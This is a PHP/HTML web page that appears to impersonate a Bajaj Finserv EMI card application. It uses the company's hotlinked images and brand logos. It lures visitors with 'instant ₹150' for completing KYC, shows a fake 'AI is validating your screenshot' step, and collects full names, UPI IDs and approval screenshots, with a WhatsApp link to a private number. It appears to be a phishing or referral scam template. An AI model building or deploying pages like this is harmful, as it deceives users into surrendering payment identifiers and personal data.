<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bajaj Finserv EMI Card - Get Instant Approval</title>
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <!-- Main Section with Image Gallery -->
    <section class="main-gallery-section" id="apply">
        <div class="container">
            <div class="gallery-layout">
                <!-- Left Side - Thumbnails -->
                <div class="thumbnails-sidebar">
                    <div class="thumbnail-item active" onclick="changeImage(this, 'https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_1.png')">
                        <img src="https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_1.png" alt="Card 1">
                    </div>
                    <div class="thumbnail-item" onclick="changeImage(this, 'https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_4.png')">
                        <img src="https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_4.png" alt="Card 2">
                    </div>
                    <div class="thumbnail-item" onclick="changeImage(this, 'https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_5.png')">
                        <img src="https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_5.png" alt="Card 3">
                    </div>
                    <div class="thumbnail-item" onclick="changeImage(this, 'https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_2.png')">
                        <img src="https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_2.png" alt="Card 4">
                    </div>
                </div>

                <!-- Center - Main Image -->
                <div class="main-image-display">
                    <img id="mainImage" src="https://ip-dynbanners.bajajfinserv.in/3in1Mobile/assets/images/emipod/clp/clp_d_1.png" alt="EMI Card">
                </div>

                <!-- Middle Description -->
                <div class="description-section">
                    <h3>Insta EMI Card</h3>
                    <p class="card-subtitle">7 crore+ card users | 1mn+ products | 1,000+ EMI schemes | Easy EMIs | No Annual Fee</p>
                    
                    <div class="product-icons">
                        <div class="icon-item">
                            <img src="https://cms-assets.bajajfinserv.in/is/image/bajajfinance/smartphone-4?scl=1&fmt=png-alpha" alt="Phone">
                            <span>Smart Phone</span>
                        </div>
                        <div class="icon-item">
                            <img src="https://images.unsplash.com/photo-1585338107529-13afc5f02586?w=100&h=100&fit=crop" alt="AC">
                            <span>AC</span>
                        </div>
                        <div class="icon-item">
                            <img src="https://images.unsplash.com/photo-1593359677879-a4bb92f829d1?w=100&h=100&fit=crop" alt="TV">
                            <span>Smart TV</span>
                        </div>
                        <div class="icon-item">
                            <img src="https://images.unsplash.com/photo-1571175443880-49e1d25b2bc5?w=100&h=100&fit=crop" alt="Refrigerator">
                            <span>Refrigerator</span>
                        </div>
                        <div class="icon-item">
                            <img src="https://images.unsplash.com/photo-1496181133206-80ce9b88a853?w=100&h=100&fit=crop" alt="Laptop">
                            <span>Laptop</span>
                        </div>
                         <div class="icon-item">
                            <img src="https://cms-assets.bajajfinserv.in/is/image/bajajfinance/bicycle-4?scl=1&fmt=png-alpha" alt="Laptop">
                            <span>Bicycle</span>
                        </div>
                    </div>
                    
                    <h4 class="brands-title">Shop at 100+ brands with Insta EMI Card</h4>
                    
                    <div class="brand-logos">
                        <div class="brand-item amazon">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
                        </div>
                        <div class="brand-item flipkart">
                            <img src="https://cdn.worldvectorlogo.com/logos/flipkart.svg" alt="Flipkart">
                        </div>
                        <div class="brand-item croma">
                            <img src="https://vectorseek.com/wp-content/uploads/2025/03/Croma-Logo-PNG-SVG-Vector.png" alt="Croma">
                        </div>
                        <div class="brand-item reliance">
                            <img src="https://upload.wikimedia.org/wikipedia/commons/0/07/RelianceLogo.png" alt="Reliance Digital">
                        </div>
                    </div>
                </div>

                <!-- Right Side - Apply Box -->
                <div class="apply-sidebar">
                    <div class="apply-box">
                        <div class="offer-badge">
                            <i class="fas fa-gift"></i>
                            <div class="offer-text">
                                <span class="offer-highlight">Limited Offer:</span>
                                <span class="offer-details">Get instant ₹150 in bank account - Only complete KYC</span>
                            </div>
                        </div>
                        
                        <button class="btn-apply blink-button" onclick="applyNow()">
                            Apply Now
                        </button>
                        
                        <div class="apply-features">
                            <div class="feature-item">
                                <i class="fas fa-bolt"></i>
                                <span>Instant Approval</span>
                            </div>
                            <div class="feature-item">
                                <i class="fas fa-shield-check"></i>
                                <span>Zero Processing Fee</span>
                            </div>
                        </div>
                    </div>
                </div>

    <!-- Confetti Container -->
    <div id="confetti-container"></div>

    <!-- Fullscreen Offer Popup -->
    <div id="offerPopup" class="offer-popup">
        <div class="popup-content">
            <i class="fas fa-gift popup-icon"></i>
            <h2 class="popup-title">Limited Offer:</h2>
            <p class="popup-text">Get instant ₹150 in bank account - Only complete KYC</p>
        </div>
    </div>

    <!-- WhatsApp Floating Button -->
    <a href="https://wa.me/917240105234" target="_blank" class="whatsapp-float blink-whatsapp">
        <i class="fab fa-whatsapp"></i>
       
    </a>
            </div>
        </div>
    </section>

    <!-- Screenshot Upload Modal -->
    <div id="uploadModal" class="modal">
        <div class="modal-content upload-modal">
            <span class="close" onclick="closeModal()">&times;</span>
            
            <div class="modal-header">
                <i class="fas fa-camera-retro modal-icon"></i>
                <h2>Upload Approval Screenshot</h2>
                <p class="modal-subtitle">Upload your Bajaj Finserv approval screenshot for instant verification</p>
            </div>
            
            <div class="upload-area" id="uploadArea">
                <input type="file" id="screenshotInput" accept="image/*" onchange="handleFileSelect(event)">
                <label for="screenshotInput">
                    <div class="upload-icon-wrapper">
                        <i class="fas fa-cloud-upload-alt upload-icon"></i>
                    </div>
                    <p class="upload-text">Click to upload or drag and drop</p>
                    <span class="upload-hint">PNG, JPG, JPEG up to 5MB</span>
                </label>
            </div>

            <div id="previewArea" style="display:none;">
                <div class="preview-container">
                    <img id="previewImage" src="" alt="Preview">
                </div>
                <div id="aiValidation" class="validation-status">
                    <div class="loader"></div>
                    <p>AI is validating your screenshot...</p>
                </div>
            </div>
        </div>
    </div>

    <!-- User Details Modal -->
    <div id="detailsModal" class="modal">
        <div class="modal-content details-modal">
            <span class="close" onclick="closeDetailsModal()">&times;</span>
            
            <div class="modal-header">
                <i class="fas fa-user-check modal-icon"></i>
                <h2>Complete Your Application</h2>
                <p class="modal-subtitle">Just one more step to get your EMI card approved</p>
            </div>
            
            <form id="userDetailsForm" onsubmit="submitApplication(event)">
                <div class="form-container">
                    <div class="form-group">
                        <label><i class="fas fa-user"></i> Full Name</label>
                        <input type="text" id="userName" name="name" placeholder="Enter your full name" required>
                    </div>
                    
                    <div class="form-group">
                        <label><i class="fas fa-mobile-alt"></i> UPI ID</label>
                        <input type="text" id="userUPI" name="upi" placeholder="yourname@upi" required>
                    </div>
                    
                    <input type="hidden" id="clickId" name="click_id">
                    <input type="hidden" id="screenshotData" name="screenshot">
                    
                    <button type="submit" class="submit-btn">
                        <i class="fas fa-paper-plane"></i>
                        Submit Application
                    </button>
                </div>
            </form>
        </div>
    </div>

    <script src="assets/js/script.js"></script>
</body>
</html>
